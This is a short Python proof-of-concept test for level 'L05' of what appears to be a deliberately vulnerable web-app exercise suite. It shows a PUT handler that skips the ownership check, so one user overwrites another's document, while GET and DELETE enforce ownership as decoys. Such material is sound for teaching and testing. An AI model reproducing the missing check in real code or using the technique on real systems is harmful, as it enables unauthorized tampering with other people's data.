"""L05 broken object-level authorization PoC.

Every route is authenticated, and read/share/delete all check ownership.
The PUT /docs/<id> handler forgets the ownership check, so Bob can
overwrite Alice's document.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import load_level, ok

mod, _, _ = load_level("L05")
client = mod.app.test_client()

bob = {"Authorization": "Bearer tok-bob"}  # uid 2
# doc 102 belongs to Alice (uid 1)

# Bob cannot read it (ownership check present on GET)
r_read = client.get("/docs/102", headers=bob)
ok(r_read.status_code == 403, "GET enforces ownership (decoy is safe)")

# ...but Bob CAN overwrite it via PUT (missing check)
r_put = client.put("/docs/102", headers=bob, json={"body": "owned-by-bob"})
ok(r_put.status_code == 200, "PUT accepted from non-owner")
ok(mod.DOCS[102]["body"] == "owned-by-bob", "Alice's document was overwritten by Bob")

# Bob still cannot delete it (ownership check present on DELETE)
r_del = client.delete("/docs/102", headers=bob)
ok(r_del.status_code == 403, "DELETE enforces ownership (decoy is safe)")
print("L05 exploit confirmed")
